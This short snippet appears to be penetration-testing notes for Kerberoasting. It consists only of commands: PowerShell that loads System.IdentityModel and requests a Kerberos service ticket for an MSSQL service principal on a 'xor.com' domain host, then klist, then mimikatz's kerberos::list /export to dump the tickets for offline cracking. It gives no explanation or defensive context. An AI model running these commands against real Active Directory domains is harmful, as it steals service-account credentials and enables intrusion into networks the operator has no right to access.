Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/xor-app23.xor.com:1433'

klist

mimikatz -> kerberos::list /export
